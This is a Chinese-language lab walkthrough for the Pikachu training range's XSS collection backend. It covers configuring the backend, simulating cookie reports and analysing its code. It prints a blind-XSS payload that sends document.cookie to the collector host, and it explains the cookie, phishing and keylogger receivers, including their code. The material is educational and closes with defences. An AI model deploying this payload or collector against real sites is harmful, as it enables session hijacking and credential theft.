# XSS后台 通关笔记

> 菜单里在「管理工具」下面。
>
> 这不是一个"漏洞关卡"，是 Pikachu 自带的 **XSS 数据接收后台**——用来收盲打、钓鱼、键盘记录的结果。
>
> **但它默认连不上数据库，得先改配置 + 初始化。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | 管理工具 → XSS后台 |
| 登录页 | `http://pikachu/pkxss/pkxss_login.php` |
| 管理页 | `http://pikachu/pkxss/xssmanager.php` |
| 初始化 | `http://pikachu/pkxss/pkxss_install.php` |
| 账号 | `admin` / `123456`（登录页底部直接写着） |
| 目标 | 登录后台，看到客户端上报的 XSS 数据 |

---

## 二、我的解题步骤

### 步骤 1：先直接打开后台

访问 `http://pikachu/pkxss/pkxss_login.php`，输入 `admin` / `123456`。

**结果：页面报错**

```
数据库连接失败，请检查config.inc.php配置文件
```

**连数据库都连不上，别说登录了。**

### 步骤 2：看配置，发现密码不对

打开 `pkxss/inc/config.inc.php`：

```php
define('DBHOST', 'localhost');
define('DBUSER', 'root');
define('DBPW', 'root');          // ← 这里
define('DBNAME', 'pkxss');
define('DBPORT', '3306');
```

而主站的 `inc/config.inc.php` 里是：

```php
define('DBPW', 'rootroot');
```

**两边的数据库密码不一致——pkxss 用了默认的 `root`，实际环境是 `rootroot`。**

### 步骤 3：改成实际密码

把 `pkxss/inc/config.inc.php` 里的：

```php
define('DBPW', 'root');
```

改成：

```php
define('DBPW', 'rootroot');
```

> 库名 `pkxss` 不用改——它会新建一个独立的库。

### 步骤 4：初始化数据库

访问：

```
http://pikachu/pkxss/pkxss_install.php
```

点「安装/初始化」按钮。

**它会做这些事：**

```php
drop database if exists pkxss;      // 先删
create database pkxss;              // 再建
create table users(...);            // 后台账号
create table cookies(...);          // cookie 搜集结果
create table fish(...);             // 钓鱼结果
create table keypress(...);         // 键盘记录结果
insert into users values(1,'admin',md5('123456'),1);
```

**注意：这个脚本会 `drop database`，重复跑会把已收到的数据清空。**

我实测的返回：

```
数据库连接成功!
新建数据库:pkxss成功!
新建数据库表users成功!
新建数据库表cookie,fish成功!
好了，可以了 点击这里 进入首页
```

### 步骤 5：重新登录

回到登录页，输入 `admin` / `123456`。

**这次成功跳转到 `xssmanager.php`。**

页面显示三个模块：

```
测试模块 | 退出登陆

cookie搜集
钓鱼结果
键盘记录
```

### 步骤 6：模拟一次"数据上报"

真实的场景是：别的页面被注入了 XSS，脚本自动把 cookie 发到这里。

我手动构造一次：

```
http://pikachu/pkxss/xcookie/cookie.php?cookie=PHPSESSID=test9f3a; uname=admin
```

访问后浏览器会跳到 `http://192.168.1.4/pikachu/index.php`（代码里写死的内网 IP，本机打不开会超时）——**但数据在跳转前已经入库了。**

### 步骤 7：看结果

打开「cookie搜集」：

```
http://pikachu/pkxss/xcookie/pkxss_cookie_result.php
```

我实测的表内容：

| id | time | ipaddress | cookie |
| --- | --- | --- | --- |
| 1 | 2026-11-09 11:18:11 | 127.0.0.1 | PHPSESSID=test9f3a; uname=admin |
| 2 | 2026-11-09 11:18:37 | 127.0.0.1 | PHPSESSID=test9f3a; uname=admin |

**后台把上报的 cookie 完整记录下来了，还带了时间、IP、Referer、User-Agent。**

---

## 三、原理分析

### 3.1 这个后台是干什么的

它是**攻击者的"接收端"**。

完整的 XSS 盲打链路：

```
受害者浏览器执行 <script>
        ↓
脚本偷偷发请求到 pkxss/xcookie/cookie.php?cookie=...
        ↓
后台把数据写进 cookies 表
        ↓
攻击者登录后台，看到受害者的 cookie
```

**靶场里没有"受害者"，所以这一步要手动模拟。**

### 3.2 三个模块对应的接收接口

| 模块 | 接收接口 | 存到哪 |
| --- | --- | --- |
| cookie 搜集 | `xcookie/cookie.php?cookie=xxx` | `cookies` 表 |
| 钓鱼结果 | `xfish/fish.php`（弹 Basic 认证） | `fish` 表 |
| 键盘记录 | `rkeypress/rkserver.php`（POST `datax`） | `keypress` 表 |

**键盘记录那个接口还开了 CORS：**

```php
header("Access-Control-Allow-Origin:*");
```

**意思是"任何域名都能往这发数据"——这正是 XSS 跨域上报需要的。**

### 3.3 cookie.php 的代码

```php
if(isset($_GET['cookie'])){
    $time=date('Y-m-d g:i:s');
    $ipaddress=getenv('REMOTE_ADDR');
    $cookie=$_GET['cookie'];
    $referer=$_SERVER['HTTP_REFERER'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $query="insert cookies(time,ipaddress,cookie,referer,useragent)
    values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result=mysqli_query($link, $query);
}
header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站
```

**两个细节：**

1. **`insert` 里的变量没转义** —— 这个接收接口自己就有 SQL 注入
2. **最后 302 到写死的 IP** —— 目的是"让受害者察觉不到"，但本机这个地址不通，所以会超时

### 3.4 登录逻辑

```php
$query="select * from users where username='$username' and password=md5('$password')";
```

登录成功后：

```php
$_SESSION['pkxss']['username']=$username;
$_SESSION['pkxss']['password']=sha1(md5($password));
```

而 `check_login()` 校验的是：

```php
$query="select * from users where username='...' and sha1(password)='...'";
```

**注意：`sha1(password)` 里的 `password` 是数据库里存的 md5 值。**

所以 `sha1(md5(明文))` 两边对得上——这个设计是对的。

---

## 四、知识点与笔记

### 4.1 为什么这一步容易卡住

| 卡点 | 原因 |
| --- | --- |
| 登录报"数据库连接失败" | config 里密码是默认值 |
| 改了密码还是失败 | 没跑 `pkxss_install.php`，`pkxss` 库不存在 |
| 登录成功但结果页空 | 还没人上报数据 |
| 上报后页面超时 | `cookie.php` 302 到 `192.168.1.4`，本机不通 |

**这四步一个都不能少。**

### 4.2 怎么确认数据真的进库了

| 方法 | 说明 |
| --- | --- |
| 看结果页表格 | 最直接 |
| 用 Navicat 连 `pkxss` 库 | 看 `cookies` 表 |
| 命令行 | `select * from cookies;` |

**结果页是最快的验证方式。**

### 4.3 怎么和"盲打"那关连起来

盲打关的 payload 通常是：

```html
<script>
new Image().src = "http://pikachu/pkxss/xcookie/cookie.php?cookie=" + document.cookie;
</script>
```

**受害者（后台管理员）打开被注入的页面 → 浏览器自动发请求 → 后台收到 cookie。**

本关就是"接收端"，盲打关是"发送端"。

### 4.4 钓鱼模块怎么玩

`xfish/fish.php` 会弹一个 **HTTP Basic 认证框**：

```php
header("WWW-Authenticate: Basic realm='认证'");
```

受害者以为是正常登录，输进去的账号密码会被转发到 `xfish.php` 存库。

**这是一种"看起来很正式"的钓鱼——浏览器原生弹窗，很多人不会怀疑。**

---

## 五、和盲打那关的关系

| | 盲打（XSS） | XSS后台（本关） |
| --- | --- | --- |
| 角色 | **发送端** | **接收端** |
| 做什么 | 注入脚本，让数据发出去 | 存下来，给攻击者看 |
| 页面 | `vul/xss/xssblind/...` | `pkxss/...` |
| 需要登录吗 | 不需要 | 需要 admin |

**两个配合起来，才是完整的"盲打"流程。**

---

## 六、防御怎么写

### 6.1 这种后台本身就不该存在

**它是攻击工具，不是业务功能。**

真实项目里不会有一个"专门收集 XSS 结果"的公开后台——**它只存在于靶场里。**

### 6.2 如果一定要有类似的日志接收

| 措施 | 说明 |
| --- | --- |
| **不放在公网** | 内网 + VPN |
| **接口要鉴权** | 签名 / token，不能裸 GET |
| **参数转义** | `cookie.php` 现在有 SQL 注入 |
| **限制来源** | 不要 `Access-Control-Allow-Origin:*` |
| **数据脱敏** | 别存完整 cookie |

### 6.3 真正的修复在"发送端"

```php
echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
```

**把 XSS 修掉，这类后台就收不到任何东西了。**

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关是什么 | Pikachu 的 XSS 数据接收后台（工具） |
| 默认能不能用 | **不能**，config 密码是 `root`，实际是 `rootroot` |
| 必须先做 | 改 `pkxss/inc/config.inc.php` + 跑 `pkxss_install.php` |
| 账号 | `admin` / `123456` |
| 三个模块 | cookie 搜集、钓鱼结果、键盘记录 |
| 实测 | 上报 `PHPSESSID=test9f3a`，结果页出现 2 条记录 |
| 坑 | `cookie.php` 会 302 到 `192.168.1.4`，本机超时但数据已入库 |

**一句话**：

> **这是"攻击者的收件箱"——盲打负责发，它负责收。**
> **但默认配置是坏的，得先把它修通。**

---

## 参考

- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
- [OWASP: XSS](https://owasp.org/www-community/attacks/xss/)
- [MDN: HTTP Basic 认证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication)
